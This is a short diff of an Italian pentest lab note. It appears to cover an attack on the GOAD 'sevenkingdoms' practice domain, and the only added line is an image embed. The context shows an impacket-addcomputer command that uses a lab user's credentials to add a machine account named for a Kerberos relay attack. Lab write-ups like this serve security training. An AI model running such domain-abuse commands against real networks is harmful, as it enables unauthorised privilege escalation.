@@ -446,3 +446,4 @@ Quindi aggiungiamo un nuovo computer al domain
 ```bash
 impacket-addcomputer -computer-name 'krbrelay$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
 ```
+![[Pasted image 20230906123509.png]]
